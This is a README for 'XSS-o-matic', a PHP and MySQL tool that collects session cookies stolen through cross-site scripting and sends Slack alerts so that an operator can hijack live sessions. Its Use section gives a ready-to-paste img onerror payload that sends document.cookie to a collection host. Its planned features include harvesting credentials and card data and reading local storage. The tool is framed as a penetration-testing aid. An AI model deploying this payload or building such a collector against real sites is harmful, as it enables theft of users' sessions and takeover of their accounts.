# XSS-o-matic
Recieve Real-Time Slack (or other) Notifications for When Session Cookies are Captured via Stored and Reflected Cross Site Scripting (XSS)

# Description
This is another API, similar to my Phishing API, except this one aids in Session Hijacking when HTML Injection/XSS is discovered on a page.  This was born out of a need to do more than the standard JavaScript alert box.  I needed a simple one-liner my team could use whenever they encountered Cross Site Scripting and I needed to act quickly via real-time notifications while the user's session was still valid.  For this to fully work properly, HttpOnly flags can't be set in the target site's cookies.  For those that aren't familiar with Session Hijacking, please read up on it from the OWASP page here : https://www.owasp.org/index.php/Session_hijacking_attack.  

TL-DR is that you can jump into a user's session without credentails to access authenticated areas of the web application.  There's a MySQL database which also captures a handful of other useful data, such as timestamps, IP addresses, User Agent strings, Hostnames, and Referer headers.

After I wrote this script I realized it may be possible to send the values directly to an IFTTT incoming webhook, essentially bypassing the need for this API or to have anything hosted.  I will need to look into that soon, but for now this works well.

# Future Implementation Goals Include : 

Capturing Cross Domain Cookies

Hidden User/Pass/CC Fields for Auto Population

Ability to Read Local Storage if Available

Integrate into IFTTT for Alterting Options


# Initial Deployment
Just host the PHP files on a web server and import the SQL Dump to create the schema.

# Use
When XSS is discovered during an Application Security or Penetration Test, simply use `<img src=x onerror=this.src='https://YOUR-URL-HERE.com/XSS.php?project=YOUR-PROJECT-HERE&cookie='+document.cookie> height=1 width=1` or a similar payload.  You may need to modify based on filtering of course, but as long as you're posting data to that URI it should work!

Happy Hijacking!



![Slack Bot Notification](https://i.imgur.com/JLVGbhe.png)
